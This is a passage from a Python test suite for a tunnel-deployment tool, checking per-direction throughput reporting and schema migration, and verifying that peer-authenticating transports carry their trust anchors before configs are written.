        row = engine.run_single_benchmark(pair, "GRE", dry_run=False, ir_runner=asym,
                                         fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertFalse(row["disqualified"], row["dq_reasons"])
        self.assertEqual(row["throughput_mbps"], 6.5, "the row's capacity is a direction, not a midpoint")
        self.assertNotEqual(row["throughput_mbps"], round((1124.19 + 6.5) / 2.0, 2))
        self.assertTrue(row["throughput_measured"])
        self.assertEqual(row["iperf3"]["capacity_basis"], "weakest_measured_leg")
        self.assertEqual({l["direction"]: (l["mbps"], l["measured"]) for l in row["iperf3"]["legs"]},
                         {"upload": (1124.19, True), "download": (6.5, True)})
        self.assertAlmostEqual(row["breakdown"]["s_bulk"], 0.065, places=3)
        self.assertIn("not an average", row["iperf3"]["leg_note"])

        # names carry the file's usual time suffix: `pairs.name` is UNIQUE, and an isolated database left
        # over from an aborted run would otherwise fail this test for a reason that has nothing to do
        # with what it checks.
        pid = storage.add_pair(f"per_leg_witness_{int(time.time() * 1000)}",
                               "198.51.100.10", "203.0.113.20", frontend_port=443)
        bid = storage.record_benchmark(pid, "GRE", row, run_id="test_66")
        stored = [b for b in storage.get_benchmarks(pid) if b["id"] == bid][0]
        self.assertAlmostEqual(stored["throughput_up_mbps"], 1124.19, places=2,
                               msg="the per-leg columns are the point: the table no longer hides them")
        self.assertAlmostEqual(stored["throughput_down_mbps"], 6.5, places=2)
        self.assertEqual(stored["capacity_basis"], "weakest_measured_leg")
        self.assertAlmostEqual(stored["throughput_mbps"], 6.5, places=2)

        # ---- 3. A direction that carried nothing must not be laundered into the ladder's number.
        dead = LeggedClient({"forward": doc(sent=1124.19 * Gbps), "reverse": doc(recv=0.0)},
                            host_role="iran")
        dead_row = engine.run_single_benchmark(pair, "GRE", dry_run=False, ir_runner=dead,
                                               fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertEqual(dead_row["throughput_mbps"], 0.0,
                         f"iperf measured the download at zero; the 1 MB ladder figure may not replace "
                         f"it: {dead_row['throughput_mbps']}")
        self.assertTrue(dead_row["throughput_measured"])
        self.assertEqual(dead_row["breakdown"]["s_bulk"], 0.0)
        self.assertIn("carried zero bytes", dead_row["iperf3"]["leg_note"])
        self.assertEqual(dead_row["iperf3"]["leg_errors"], [], dead_row["iperf3"]["leg_errors"])

        # ---- 4. When -R never completed, the only download reading there is comes from the ladder -
        #      and an enormous upload may not stand in for it.
        hung = LeggedClient({"forward": doc(sent=1124.19 * Gbps),
                            "reverse": TimeoutError("Channel timeout")}, host_role="iran")
        hung_row = engine.run_single_benchmark(pair, "GRE", dry_run=False, ir_runner=hung,
                                               fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        ladder_only = round((1048576 * 8) / (0.082 * 1000000.0), 2)
        self.assertEqual(hung_row["iperf3"]["download_mbps"], 0.0, "the leg that never finished stays 0")
        self.assertFalse([l for l in hung_row["iperf3"]["legs"]
                          if l["direction"] == "download"][0]["measured"], hung_row["iperf3"]["legs"])
        self.assertEqual(hung_row["throughput_mbps"], ladder_only,
                         f"the upload leg must be capped by the real download reading ({ladder_only}), "
                         f"not published as 1124.19: {hung_row['throughput_mbps']}")
        self.assertEqual(hung_row["iperf3"]["download_source"], "ladder_1mb_step")
        self.assertIn("ladder step", hung_row["iperf3"]["leg_note"])

        # ---- 5. Neither direction measured: the ladder number survives and says where it came from.
        both_hung = LeggedClient({"forward": TimeoutError("a"), "reverse": TimeoutError("b")},
                                host_role="iran")
        none_row = engine.run_single_benchmark(pair, "GRE", dry_run=False, ir_runner=both_hung,
                                              fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertFalse(none_row["iperf3"]["available"], none_row["iperf3"])
        self.assertEqual(none_row["iperf3"]["capacity_basis"], "ladder_download_only", none_row["iperf3"])
        self.assertEqual(none_row["throughput_mbps"], ladder_only, none_row["throughput_mbps"])
        self.assertFalse(none_row["throughput_measured"],
                         "no iperf reading means the score keeps the discrete ladder fallback")
        none_pid = storage.add_pair(f"per_leg_none_{int(time.time() * 1000)}",
                                    "198.51.100.10", "203.0.113.20", frontend_port=443)
        none_bid = storage.record_benchmark(none_pid, "GRE", none_row, run_id="test_66_none")
        none_stored = [b for b in storage.get_benchmarks(none_pid) if b["id"] == none_bid][0]
        self.assertIsNone(none_stored["throughput_up_mbps"],
                          "an unmeasured direction is NULL, not a 0.0 that reads as 'carried nothing'")
        self.assertIsNone(none_stored["throughput_down_mbps"])

        # ---- 6. Rows written before the legs existed are recovered and labelled, not reinterpreted.
        with storage.db_session() as conn:
            cur = conn.execute(
                "INSERT INTO benchmarks (pair_id, protocol, throughput_mbps, details_json, created_at) "
                "VALUES (?, 'GRE', ?, ?, ?)",
                (pid, 565.35, json.dumps({"iperf3": {"available": True, "upload_mbps": 1124.19,
                                                     "download_mbps": 0.0,
                                                     "throughput_mbps": 565.35}}), time.time()))
            legacy_id = cur.lastrowid
            # A row written after the legs became visible but before the scalar became the weakest
            # direction: it stores both legs and no basis, and the scalar it stored was the average.
            seeded = {}
            for key, extra in (("pre_leg", {}), ("carried", {"capacity_basis": "weakest_measured_leg"})):
                ip = {"available": True, "throughput_mbps": 565.35,
                      "legs": [{"direction": "upload", "mbps": 1124.19, "measured": True, "error": ""},
                               {"direction": "download", "mbps": 6.5, "measured": True, "error": ""}]}
                ip.update(extra)
                cur.execute(
                    "INSERT INTO benchmarks (pair_id, protocol, throughput_mbps, details_json, "
                    "created_at) VALUES (?, 'GRE', ?, ?, ?)",
                    (pid, 565.35, json.dumps({"iperf3": ip}), time.time()))
                seeded[key] = cur.lastrowid
            conn.execute("DELETE FROM schema_version WHERE version = 6")
        storage.init_db()
        legacy_row = [b for b in storage.get_benchmarks(pid) if b["id"] == legacy_id][0]
        self.assertAlmostEqual(legacy_row["throughput_up_mbps"], 1124.19, places=2,
                               msg="migration 6 backfills the legs a legacy row already recorded")
        self.assertIsNone(legacy_row["throughput_down_mbps"],
                          "a legacy 0.0 cannot be told apart from unmeasured, so it backfills as NULL")
        self.assertEqual(legacy_row["capacity_basis"], "legacy-single-leg",
                         "and the basis names the rule that produced the scalar, so nobody compares it "
                         "to a weakest-leg number as if they meant the same thing")
        self.assertEqual(legacy_row["throughput_mbps"], 565.35,
                         "history is not rewritten: the old scalar stays as it was scored")
        by_id = {b["id"]: b for b in storage.get_benchmarks(pid)}
        pre_leg = by_id[seeded["pre_leg"]]
        self.assertEqual((pre_leg["throughput_up_mbps"], pre_leg["throughput_down_mbps"]),
                         (1124.19, 6.5), pre_leg)
        self.assertEqual(pre_leg["capacity_basis"], "legacy-average",
                         "a row that stored two legs but no basis was written while the scalar was "
                         "still their average; crediting it to the weakest-leg rule would relabel "
                         f"history as a measurement it never was: {pre_leg['capacity_basis']}")
        self.assertEqual(by_id[seeded["carried"]]["capacity_basis"], "weakest_measured_leg",
                         "a row that did record its basis keeps it through the backfill")
        self.assertEqual(storage.get_schema_version(), storage.SCHEMA_VERSION,
                         "v9 must ride along here too - a literal would have to be edited every round")
        storage.init_db()
        with storage.db_session() as conn:
            n = conn.execute("SELECT COUNT(*) FROM schema_version WHERE version = 6").fetchone()[0]
        self.assertEqual(n, 1, "re-running init must not double-apply the migration")

        # ---- 7. The dashboard renders both directions instead of one number.
        self.assertIn("throughput_up_mbps", dashboard.PAGE)
        self.assertIn("throughput_down_mbps", dashboard.PAGE)
        self.assertIn("function legSummary", dashboard.PAGE)
        self.assertIn("ضعیف‌ترین جهت", dashboard.PAGE,
                      "the ultraspeed banner must name the direction it is claiming")
        # The banner's own literal, quoted, because the same phrase also appears in the chip's tooltip -
        # matching the loose phrase alone cannot tell "the banner claims the weak direction" from "the
        # banner was reverted and only the tooltip survived".
        self.assertIn("'ضعیف‌ترین جهتِ اندازه‌گیری‌شده: '", dashboard.PAGE,
                      "the ultraspeed winner reason must be the pinned literal")
        self.assertIn("میانگین دو جهت مخالف نیست", dashboard.PAGE,
                      "and it must still say the number is not an average")
        # A row that never measured anything shows no leg chip rather than a confident 0.0.
        self.assertIn("if (!measured.length) return", dashboard.PAGE)

        # And the renderer is *executed*, not just string-matched, when node is available: a chip that
        # prints the wrong number is as broken as a function that does not compute it.
        node = shutil.which("node")
        if node:
            start = dashboard.PAGE.index("function legSummary(b) {")
            depth, end = 0, None
            for i, ch in enumerate(dashboard.PAGE[start:], start):
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0:
                        end = i + 1
                        break
            self.assertIsNotNone(end, "could not extract the leg renderer")
            driver = (dashboard.PAGE[start:end]
                      + "\nconst rows = JSON.parse(process.argv[2]);\n"
                      + "process.stdout.write(JSON.stringify(rows.map(legSummary)));\n")
            script = os.path.join(tempfile.mkdtemp(), "legsummary.js")
            with open(script, "w", encoding="utf-8") as fh:
                fh.write(driver)
            cases = [{"throughput_up_mbps": 1124.19, "throughput_down_mbps": 6.5},
                     {"throughput_up_mbps": 1124.19, "throughput_down_mbps": None},
                     {"throughput_up_mbps": 1124.19, "throughput_down_mbps": 0.0},
                     {"throughput_up_mbps": None, "throughput_down_mbps": None},
                     {"throughput_up_mbps": 40.0, "throughput_down_mbps": 38.0}]
            proc = subprocess.run([node, script, json.dumps(cases)], capture_output=True,
                                  encoding="utf-8", timeout=60)
            self.assertEqual(proc.returncode, 0, proc.stderr[:300])
            shown = json.loads(proc.stdout)
            self.assertEqual(shown[0]["text"], "\u21911124.2 \u21936.5 Mbps", shown[0])
            self.assertEqual(shown[0]["weak"], 6.5,
                             "the number a reader trusts must be the weaker direction")
            self.assertIn("173.0", shown[0]["warn"], shown[0])
            self.assertEqual(shown[1]["weak"], 1124.19, shown[1])
            self.assertIn("تنها یک جهت", shown[1]["warn"], shown[1])
            self.assertEqual(shown[2]["weak"], 0.0, shown[2])
            self.assertIn("بسته شد", shown[2]["warn"], shown[2])
            self.assertEqual((shown[3]["text"], shown[3]["weak"]), ("", None), shown[3])
            self.assertNotIn("0.0", json.dumps(shown[3]), "no direction may be printed as a fake zero")
            self.assertEqual(shown[4]["warn"], "", shown[4])
        else:
            print("    [test_66] node is not installed: the leg renderer is string-pinned only, "
                  "so its arithmetic is unverified on this machine")

        # ---- 8. A simulated row must not invent per-direction measurements.
        # The dry-run path used to publish download = 1.05x and upload = 0.95x of one number: two
        # "measurements" that no host ever made, which is precisely the shape a reviewer mistakes for
        # evidence of asymmetry.
        sim = engine.run_single_benchmark(pair, "GRE", dry_run=True)
        self.assertEqual(sim["iperf3"]["capacity_basis"], "simulated", sim["iperf3"])
        self.assertEqual({l["mbps"] for l in sim["iperf3"]["legs"]}, {sim["throughput_mbps"]},
                         "every simulated leg must equal the one simulated number")

        # ---- 9. One row shape for every outcome, so readers never meet a missing key.
        blocked = engine._blocked_row("GRE", "balanced", 40.0, "NOT_MEASURABLE: pinned in the test")
        self.assertIs(blocked["throughput_measured"], False, blocked)
        for label, r in (("blocked", blocked), ("dead", dead_row), ("hung", hung_row),
                        ("none", none_row)):
            self.assertIn("throughput_measured", r, label)

        # ---- 10. The migration itself has to survive a database that has no benchmarks table at all.
        # A partially restored legacy file can mark migrations 1-4 applied while only pairs exists on
        # disk; adding columns to a table that is not there is an init_db crash, and init_db runs at
        # import time, so it would take the whole product down on that operator's machine.
        odd_db = os.path.join(tempfile.mkdtemp(), "no_benchmarks.db")
        seed = sqlite3.connect(odd_db)
        seed.execute("CREATE TABLE pairs (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT UNIQUE NOT NULL,"
                     " iran_host TEXT NOT NULL, iran_port INTEGER DEFAULT 22, foreign_host TEXT NOT NULL,"
                     " foreign_port INTEGER DEFAULT 22, frontend_port INTEGER DEFAULT 443,"
                     " status TEXT DEFAULT 'NEW', active_tunnel TEXT DEFAULT '', base_rtt_ms REAL,"
                     " created_at REAL NOT NULL, updated_at REAL NOT NULL)")
        seed.execute("CREATE TABLE schema_version (version INTEGER PRIMARY KEY, applied_at REAL NOT NULL,"
                     " description TEXT NOT NULL)")
        for v in (1, 2, 3, 4, 5):
            seed.execute("INSERT INTO schema_version VALUES (?, ?, ?)", (v, time.time(), "migration"))
        seed.commit()
        seed.close()
        saved_db = storage.DB_PATH
        try:
            storage.DB_PATH = odd_db
            storage.init_db()
            self.assertEqual(storage.get_schema_version(), storage.SCHEMA_VERSION,
                             "the newest migration records itself even where there is nothing to "
                             "migrate; v6 has to land here too, because this is the shape of a "
                             "database written before the benchmarks table existed")
            with storage.db_session() as conn:
                row = conn.execute("SELECT description FROM schema_version WHERE version = 6").fetchone()
            self.assertIn("backfilled 0", row[0], row[0])
        finally:
            storage.DB_PATH = saved_db
            storage.init_db()

    def test_67_a_transport_that_verifies_its_destination_is_checked_before_it_is_written(self):
        """Agenda #39, round A: the product generates the material its own clients trust, and until
        now nothing read that material back.

        Two distinct defects hide in that gap, and a latency score sees neither. The first is a
        generator regression: a transport that is supposed to verify its peer emits a config that no
        longer carries the anchor, or names a trust file the deployment never writes. report049 shipped
        exactly that shape for wstunnel - a client with no CA starts, completes the handshake against
        whoever answers the port, and reports a healthy tunnel. The second is invisible by construction:
        nothing recorded which key a pair's tunnel had been built around, so "restarted" and "replaced"
        were the same observation.

        This test pins the derivation, the three write paths that now consult it, and the reason a pin
        mismatch is recorded rather than refused.
        """
        import re
        IR, FR = "198.51.100.10", "203.0.113.20"

        def prod_plan(proto, pair_id=1):
            return protocols.generate_deployment(proto, pair_id,
                                                 protocols.dial_address({"host": IR}, proto),
                                                 protocols.dial_address({"host": FR}, proto), 443)

        # ---- 1. Inventory: every generator is classified, and the classification is read off the
        #         emitted config rather than asserted by a table.
        seen_pinned = set()
        for proto in sorted(protocols.GENERATORS):
            info = protocols.destination_pin(proto, prod_plan(proto))
            self.assertNotEqual(info["mechanism"], "not described",
                                f"{proto} has no destination-authentication description; a new "
                                f"transport must say what proves its peer is the peer")
            self.assertIn(info["status"], ("pinned", "unauthenticated"),
                          f"{info['status']} is a state no caller knows how to act on")
            if proto in protocols.DESTINATION_ANCHORS:
                self.assertEqual(info["status"], "pinned",
                                 f"{proto} names an anchor but the emitted plan does not carry it: "
                                 f"{info['status']}")
                self.assertTrue(info["verifies_peer"] and info["pins_destination"])
                self.assertTrue(info["fingerprint"].startswith("sha256:") and
                                len(info["fingerprint"]) == 71, info["fingerprint"])
                seen_pinned.add(proto)
            else:
                self.assertEqual(info["status"], "unauthenticated", proto)
                self.assertFalse(info["verifies_peer"], proto)
                self.assertEqual(info["fingerprint"], "", proto)
        self.assertEqual(sorted(seen_pinned), sorted(protocols.DESTINATION_ANCHORS),
                         "the set of transports that really pin must equal the set declared to pin")

        # ---- 2. The three regression shapes, as pure plan mutations. Each is a generator bug the
        #         existing JSON validation cannot see, because the config still parses.
        def copy_of(plan):
            return json.loads(json.dumps(plan))

        def drop_flag(plan, flag):
            out = copy_of(plan)
            for side in ("iran_files", "foreign_files"):
                for path, content in (out.get(side) or {}).items():
                    if flag in content:
                        out[side][path] = re.sub(re.escape(flag) + r"\s*\S+", "", content)
            return out

        def drop_file(plan, fpath):
            out = copy_of(plan)
            for side in ("iran_files", "foreign_files"):
                (out.get(side) or {}).pop(fpath, None)
            return out

        def blank_value(plan, key):
            out = copy_of(plan)
            for side in ("iran_files", "foreign_files"):
                for path, content in (out.get(side) or {}).items():
                    if key in content:
                        out[side][path] = re.sub(r'("' + key + r'":\s*)"[^"]*"', r'\1""', content)
                        out[side][path] = re.sub(r'(' + key + r'\s*=\s*)"[^"]*"',
                                                 r'\1""', out[side][path])
            return out

        def corrupt_file(plan, fpath):
            out = copy_of(plan)
            for side in ("iran_files", "foreign_files"):
                if fpath in (out.get(side) or {}):
                    out[side][fpath] = "this was a certificate once\n"
            return out

        shapes = [
            ("chisel-wss", drop_flag(prod_plan("chisel-wss"), "--tls-ca"), "no-anchor-in-client-config",
             "the flag that made chisel verify is gone"),
            ("wstunnel-v10",
             drop_file(prod_plan("wstunnel-v10"),
                       protocols.destination_pin("wstunnel-v10", prod_plan("wstunnel-v10"))["anchor"]),
             "anchor-missing-or-unparseable", "report049's shape: a client naming a file nobody wrote"),            ("frp-TLS",
             corrupt_file(prod_plan("frp-TLS"),
                          protocols.destination_pin("frp-TLS", prod_plan("frp-TLS"))["anchor"]),
             "anchor-missing-or-unparseable", "an unparseable trust file is not a verified peer"),
            ("rathole-noise", blank_value(prod_plan("rathole-noise"), "remote_public_key"),
             "no-anchor-in-client-config", "an empty static key silently disables Noise_NK"),
            ("singbox-vless-reality", blank_value(prod_plan("singbox-vless-reality"), "public_key"),
             "no-anchor-in-client-config", "an empty REALITY public key means the client proves nothing"),
        ]
        # The CA written only where the *server* reads it. A checker that falls back to the peer's copy
        # computes a real fingerprint for a file the client cannot open and calls a client that verifies
        # nothing "pinned" - that was the bug in this round's first draft, found by the mutation harness
        # proving the fallback was dead code, so the case is kept here instead of the fallback.
        ws = prod_plan("wstunnel-v10")
        ws_anchor = protocols.destination_pin("wstunnel-v10", ws)["anchor"]
        self.assertTrue(ws_anchor, "wstunnel's client names no trust file at all")
        peer_only = copy_of(ws)
        self.assertIn(ws_anchor, peer_only["foreign_files"],
                      "fixture premise: the client's CA is a file this plan writes")
        peer_only["iran_files"][ws_anchor] = peer_only["foreign_files"].pop(ws_anchor)
        shapes.append(("wstunnel-v10", peer_only, "anchor-missing-or-unparseable",
                       "the anchor exists on the peer, not where the client reads it"))

        for proto, mutant, expected, why in shapes:
            info = protocols.destination_pin(proto, mutant)
            self.assertTrue(info["status"].startswith(expected),
                            f"{why}: got {info['status']} for {proto}")
            self.assertFalse(info["verifies_peer"],
                             f"{proto} must not claim a verifying client it does not have")

        pid = storage.add_pair(name=f"destpin-{int(time.time() * 1000)}", iran_host=IR,
                               foreign_host=FR, frontend_port=9455)
        self.addCleanup(storage.delete_pair, pid)
        pair = {"id": pid, "name": "destpin", "frontend": 9455, "frontend_port": 9455,
                "iran": {"host": IR, "port": 22, "user": "root"},
                "foreign": {"host": FR, "port": 22, "user": "root"}}

        for proto, mutant, expected, why in shapes:
            text = engine.destination_pin_block(pid, proto, mutant)
            self.assertIn("NOT_MEASURABLE", text, why)
            self.assertIn(proto, text, "a refusal has to name what it refused")
            self.assertIn(expected, text, why)
            self.assertIsNone(re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", text),
                              f"a refusal text must not carry an address: {text[:120]}")

        # ---- 3. Each write path consults the gate, on the plan it is about to write, and refuses
        #         before a host is touched. One gate with three call sites is the whole point: the
        #         carrier gate shipped twice and the defect class survived (test_62).
        # Identity, not equality: two implementations of one rule drift, and the drift shows up only on
        # the path nobody tests (test_62's lesson, applied to this gate).
        self.assertIs(failover.engine.destination_pin_block, engine.destination_pin_block,
                      "every path must consult the same gate function object")
        bench_ir = mock_ssh.MockSSHClient(host_role="iran")
        bench_fr = mock_ssh.MockSSHClient(host_role="foreign")
        real_bench = protocols.generate_benchmark_plan
        protocols.generate_benchmark_plan = lambda *a, **k: drop_flag(real_bench(*a, **k), "--tls-ca")
        try:
            row = engine.run_single_benchmark(pair, "chisel-wss", dry_run=False, profile="gaming",
                                              ir_runner=bench_ir, fr_runner=bench_fr)
        finally:
            protocols.generate_benchmark_plan = real_bench
        self.assertTrue(row["disqualified"] and row["not_measurable"],
                        f"a plan with no anchor is not a measurement: {row['dq_reasons']}")
        self.assertEqual(row["score"], 0.0)
        self.assertEqual(row["stages_measured"], [])
        self.assertIn("no-anchor-in-client-config", " ".join(row["dq_reasons"]), row["dq_reasons"])
        self.assertEqual(row["base_rtt_ms"], 42.0, "a refusal still reports what the underlay was worth")
        # The position of the call is part of the control, not an implementation detail: a gate that
        # runs after the file writes would refuse the same plan and leave the refused tunnel staged and
        # started on both hosts. Attribute patching cannot move it, so the state has to be asserted here.
        # Checklist 1-3 (pre-clean and the test backend) legitimately ran before the plan existed, so
        # the claim is scoped to this transport's own config and unit files.
        real_bplan = protocols.generate_benchmark_plan("chisel-wss", pid, IR, FR)
        refused_paths = set(real_bplan.get("iran_files", {})) | set(real_bplan.get("foreign_files", {}))
        staged = set(bench_ir.state["files"]) | set(bench_fr.state["files"])
        self.assertEqual(staged & refused_paths, set(),
                         f"the refused benchmark plan was staged anyway: {sorted(staged & refused_paths)}")
        # The `finally` teardown stops every unit in the plan, so an entry marked inactive is expected
        # and means nothing; what must never appear is a unit that reached active.
        self.assertNotIn("active", bench_ir.state["services"].values(),
                         f"a refused transport was started on Iran: {bench_ir.state['services']}")
        self.assertNotIn("active", bench_fr.state["services"].values(),
                         f"a refused transport was started on Foreign: {bench_fr.state['services']}")

        def spy(spec, dry_run=None, host_role="unknown"):
            raise AssertionError(f"deploy_tunnel opened a {host_role} session despite the anchor gate")

        real_dep = protocols.generate_deployment
        real_factory = engine.get_ssh_runner
        engine.get_ssh_runner = spy
        protocols.generate_deployment = lambda *a, **k: drop_flag(real_dep(*a, **k), "--tls-ca")
        ir_live = mock_ssh.MockSSHClient(host_role="iran")
        fr_live = mock_ssh.MockSSHClient(host_role="foreign")
        live_plan = prod_plan("chisel-wss", pid)
        for unit in live_plan.get("iran_units", []):
            ir_live.state["services"][unit] = "active"
        for path, content in live_plan.get("iran_files", {}).items():
            ir_live.state["files"][path] = content
        for unit in live_plan.get("foreign_units", []):
            fr_live.state["services"][unit] = "active"
        try:
            with self.assertRaises(ValueError) as ctx:
                engine.deploy_tunnel(pair=pair, choice="chisel-wss", dry_run=False,
                                     force_confirmed=True, ir_runner=ir_live, fr_runner=fr_live)
            self.assertIn("NOT_MEASURABLE", str(ctx.exception))
            with self.assertRaises(ValueError):
                engine.deploy_tunnel(pair=pair, choice="chisel-wss", dry_run=False,
                                     force_confirmed=True)
        finally:
            protocols.generate_deployment = real_dep
            engine.get_ssh_runner = real_factory
        # The refusal happened before the rollback branch, so the tunnel serving traffic right now is
        # intact. A gate that refuses by tearing down what was already working is an outage, not a control.
        for unit in live_plan.get("iran_units", []):
            self.assertEqual(ir_live.state["services"].get(unit), "active", f"{unit} was stopped")
        for unit in live_plan.get("foreign_units", []):
            self.assertEqual(fr_live.state["services"].get(unit), "active", f"{unit} was stopped")
        self.assertEqual(set(fr_live.state["files"]), set(), "the refusal staged a foreign config")
        self.assertEqual(set(ir_live.state["files"]), set(live_plan.get("iran_files", {})),
                         "the refusal wrote or removed a config")
        # Contents, not just paths: the next generation of this tunnel writes the *same* paths, so a
        # key-set comparison would pass even if the refusal had overwritten a live config.
        self.assertEqual(ir_live.state["files"], dict(live_plan.get("iran_files", {})),
                         "the refusal overwrote a live Iran config")

        mgr = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=50,
                                       window_seconds=3600)
        protocols.generate_deployment = lambda *a, **k: drop_flag(real_dep(*a, **k), "--tls-ca")
        fa_ir = mock_ssh.MockSSHClient(host_role="iran")
        fa_fr = mock_ssh.MockSSHClient(host_role="foreign")
        for unit in live_plan.get("iran_units", []):
            fa_ir.state["services"][unit] = "active"
        try:
            heal = mgr.execute_failover(pair, "chisel-wss", "chisel-wss",
                                        reason="attempt onto a plan with no anchor", dry_run=True,
                                        ir_runner=fa_ir, fr_runner=fa_fr)
        finally:
            protocols.generate_deployment = real_dep
        self.assertFalse(heal["success"])
        self.assertTrue(heal.get("blocked"), f"a switchover refusal is not a failed switchover: {heal}")
        self.assertTrue(heal.get("not_measurable"))
        self.assertIn("no-anchor-in-client-config", heal["reason"])
        self.assertEqual(fa_ir.state["files"], {}, "Stage 2 staged a config the gate had refused")
        for unit in live_plan.get("iran_units", []):
            self.assertEqual(fa_ir.state["services"].get(unit), "active",
                             f"{unit} was torn down by a refusal, which is the blackout this gate exists "
                             f"to avoid")
        blocked = [r for r in storage.get_audit_logs(limit=400)
                   if r["pair_id"] == pid and r["status"] == "DESTINATION_ANCHOR_REFUSAL"]
        self.assertTrue(blocked, "an automated refusal nobody can read is not a control")
        self.assertEqual(blocked[0]["action"], "FAILOVER_BLOCKED")

        # ---- 4. What a pin is worth today: recorded, not refused. Two consecutive generations of an
        #         unchanged pair and protocol already disagree, measured in scratch/probe_anchor_rotation.py
        #         for all six anchored transports, because the generators create the key material inside
        #         the plan (protocols.py:90, :141, :1051-1058). A mismatch-refusal would therefore reject
        #         every legitimate redeploy - which is why this assertion locks the *current* semantics
        #         and any future strict TOFU has to change it deliberately, together with persistence.
        plan_a = prod_plan("chisel-wss", pid)
        pin_a = protocols.destination_pin("chisel-wss", plan_a)
        self.assertEqual(engine.destination_pin_block(pid, "chisel-wss", plan_a, record=True), "",
                         "a first deploy records and proceeds")
        stored = storage.get_destination_pin(pid, "chisel-wss")
        self.assertEqual(stored["fingerprint"], pin_a["fingerprint"])
        self.assertEqual(stored["changed_at"], 0.0, "a pin that never moved must say so")
        self.assertEqual(storage.record_destination_pin(pid, "chisel-wss", pin_a["mechanism"],
                                                        pin_a["fingerprint"])["status"], "match")
        plan_b = prod_plan("chisel-wss", pid)
        pin_b = protocols.destination_pin("chisel-wss", plan_b)
        self.assertNotEqual(pin_a["fingerprint"], pin_b["fingerprint"],
                            "the probe said anchors rotate per generation; if that stopped being true, "
                            "say so here and revisit the refusal decision")
        self.assertEqual(engine.destination_pin_block(pid, "chisel-wss", plan_b, record=True), "",
                         "a redeploy is not an attack")
        rotated = storage.get_destination_pin(pid, "chisel-wss")
        self.assertEqual(rotated["fingerprint"], pin_b["fingerprint"])
        self.assertGreater(rotated["changed_at"], 0.0)
        self.assertGreaterEqual(rotated["last_seen"], rotated["first_seen"])
        rot_log = [r for r in storage.get_audit_logs(limit=400)
                   if r["pair_id"] == pid and r["action"] == "DESTINATION_PIN_ROTATED"]
        self.assertTrue(rot_log, "a moved anchor without a durable trace is the failure this table prevents")
        self.assertEqual(rot_log[0]["status"], "WARNING")
        self.assertIn(pin_a["fingerprint"], rot_log[0]["details"])
        self.assertIn(pin_b["fingerprint"], rot_log[0]["details"])

        # An ephemeral benchmark anchor is not the production tunnel's identity.
        self.assertEqual(engine.destination_pin_block(pid, "chisel-wss",
                                                      protocols.generate_benchmark_plan(
                                                          "chisel-wss", pid, IR, FR), record=False), "")
        self.assertEqual(storage.get_destination_pin(pid, "chisel-wss")["fingerprint"],
                         pin_b["fingerprint"], "a bench plan rewrote the production pin")

        # A transport that authenticates nothing has no identity to record, and is not refused either:
        # that is a property of GRE/kcptun/xray-reverse, judged by the carrier gate, not by this one.
        self.assertEqual(engine.destination_pin_block(pid, "kcptun", prod_plan("kcptun", pid),
                                                      record=True), "")
        self.assertIsNone(storage.get_destination_pin(pid, "kcptun"))

        self.assertTrue(storage.unpin_destination(pid, "chisel-wss"))
        self.assertIsNone(storage.get_destination_pin(pid, "chisel-wss"))
        self.assertFalse(storage.unpin_destination(pid, "chisel-wss"),
                         "unpinning what is not pinned must report that, not pretend")
        self.assertTrue([r for r in storage.get_audit_logs(limit=400)
                         if r["pair_id"] == pid and r["action"] == "UNPIN_DESTINATION"])

        # ---- 5. The healthy path still works end to end, so the gate is a check and not a wall.
        ok_ir = mock_ssh.MockSSHClient(host_role="iran")
        ok_fr = mock_ssh.MockSSHClient(host_role="foreign")
        dep = engine.deploy_tunnel(pair=pair, choice="chisel-wss", dry_run=False,
                                   force_confirmed=True, ir_runner=ok_ir, fr_runner=ok_fr)
        self.assertTrue(dep["ok"], f"an anchored transport must still deploy: {dep}")
        self.assertIsNotNone(storage.get_destination_pin(pid, "chisel-wss"),
                             "the deploy that wrote the anchor must record it")
        self.assertIn("chisel", protocols.describe_destination_authentication("chisel-wss", plan_b))
        self.assertIn("pin=sha256:", protocols.describe_destination_authentication("chisel-wss", plan_b),
                      "the operator line has to carry the whole fingerprint, or it cannot be compared")

        # ---- 6. A dry run previews a deployment; it does not perform one. Found by probing my own
        #         shipped gate rather than by a test (scratch/probe_dryrun_pin.py): the gate recorded
        #         on every call, so `dry_run=True` wrote a pin for a tunnel that does not exist, and
        #         because each generation rotates the anchor, the *second* dry run raised a
        #         DESTINATION_PIN_ROTATED WARNING - i.e. "somebody replaced the key out of band", from
        #         a command that opened no session. A false alarm on a security audit trail is worse
        #         than no alarm: it teaches an operator to dismiss the one row that means something.
        dry_pid = storage.add_pair(name=f"destpin-dry-{int(time.time() * 1000)}", iran_host=IR,
                                   foreign_host=FR, frontend_port=9466)
        self.addCleanup(storage.delete_pair, dry_pid)
        dry_pair = {"id": dry_pid, "name": "destpin-dry", "frontend": 9466, "frontend_port": 9466,
                    "iran": {"host": IR, "port": 22, "user": "root"},
                    "foreign": {"host": FR, "port": 22, "user": "root"}}
        for _ in range(2):
            preview = engine.deploy_tunnel(pair=dry_pair, choice="chisel-wss", dry_run=True,
                                           force_confirmed=True,
                                           ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
                                           fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
            self.assertTrue(preview["ok"], f"a dry run must still preview cleanly: {preview}")
        self.assertIsNone(storage.get_destination_pin(dry_pid, "chisel-wss"),
                          "a dry run deployed no tunnel, so it may not record one's identity")
        dry_rot = [r for r in storage.get_audit_logs(limit=400)
                   if r["pair_id"] == dry_pid and r["action"] == "DESTINATION_PIN_ROTATED"]
        self.assertEqual(dry_rot, [], "a dry run raised a rotation warning it had no evidence for")

        # The dangerous shape is a preview against a pair that already has a live pin: the stored value
        # is that tunnel's identity, and reading it must require an actual deployment.
        live_pin = storage.get_destination_pin(pid, "chisel-wss")["fingerprint"]
        engine.deploy_tunnel(pair=pair, choice="chisel-wss", dry_run=True, force_confirmed=True,
                             ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
                             fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertEqual(storage.get_destination_pin(pid, "chisel-wss")["fingerprint"], live_pin,
                         "a dry run replaced the live tunnel's recorded pin")

